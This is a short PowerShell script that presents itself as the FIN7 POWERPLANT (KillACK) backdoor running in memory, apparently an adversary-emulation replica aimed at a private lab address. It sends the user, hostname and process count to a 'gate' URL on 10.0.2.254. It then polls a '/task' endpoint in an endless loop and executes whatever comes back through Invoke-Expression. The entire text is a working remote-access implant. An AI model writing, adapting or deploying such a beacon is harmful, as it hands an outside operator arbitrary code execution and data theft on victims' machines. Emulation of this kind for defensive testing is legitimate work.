Write-Host "[*] FIN7 POWERPLANT (KillACK) Executed in Memory"
$os = "Ubuntu-Container"
$user = (whoami)
$hostname = hostname
$procs = (Get-Process).Count
Invoke-RestMethod -Uri "http://10.0.2.254:80/gate?user=$user&os=$os&host=$hostname&procs=$procs" -Method GET -ErrorAction SilentlyContinue
while ($true) {
    $task = Invoke-RestMethod -Uri "http://10.0.2.254:80/task" -Method GET -ErrorAction SilentlyContinue
    if ($task) { Invoke-Expression $task }
    Start-Sleep -Seconds 10
}
